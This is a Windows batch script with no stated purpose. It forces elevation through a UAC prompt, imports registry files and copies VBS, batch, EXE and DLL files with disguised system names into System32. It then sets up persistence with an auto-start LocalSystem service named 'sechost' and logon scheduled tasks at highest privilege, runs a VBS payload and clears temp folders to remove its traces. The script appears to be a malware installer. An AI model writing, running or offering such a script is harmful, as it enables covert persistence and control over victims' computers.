@echo off
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC=CreateObject^("Shell.Application"^)>"%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe","/c ""%~s0""","","runas",1>>"%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)
whoami /groups | find "Administrators" > nul
if %errorLevel% neq 0 (
    exit /b 1
)
if exist "%~dp0RegistrationDomains.reg" (
    "%SystemRoot%\System32\reg.exe" import "%~dp0RegistrationDomains.reg"
)
if exist "%~dp0Vimeo.reg" (
    "%SystemRoot%\System32\reg.exe" import "%~dp0Vimeo.reg"
)
if exist "%~dp0c.vbs" (
    copy /y "%~dp0c.vbs" "%SystemRoot%\System32\c.vbs"
)
if exist "%~dp0b.vbs" (
    copy /y "%~dp0b.vbs" "%SystemRoot%\System32\b.vbs"
)
if exist "%~dp0adamsatmayiz.bat" (
    copy /y "%~dp0adamsatmayiz.bat" "%SystemRoot%\System32\adamsatmayiz.bat"
)
if exist "%~dp0svckutils.exe" (
    copy /y "%~dp0svckutils.exe" "%SystemRoot%\System32\svckutils.exe"
)
if exist "%~dp0secsvc.dll" (
    copy /y "%~dp0secsvc.dll" "%SystemRoot%\System32\secsvc.dll"
)
timeout /t 1 /nobreak
sc create sechost binPath= "C:\u.exe" DisplayName= "sechost" start= auto obj= LocalSystem
schtasks /create /tn "svckutils" /tr "C:\Windows\system32\svckutils.exe" /sc ONLOGON /rl HIGHEST /f
schtasks /create /tn "cvbs" /tr "C:\Windows\system32\c.vbs" /sc ONLOGON /rl HIGHEST /f
if exist "%SystemRoot%\System32\b.vbs" (
    cscript "%SystemRoot%\System32\b.vbs"
)
if exist "%SystemDrive%\reg" (
    rmdir /s /q "%SystemDrive%\reg"
)
del /q /f "%temp%\*" 2>nul
for /d %%i in ("%temp%\*") do rmdir /s /q "%%i"

exit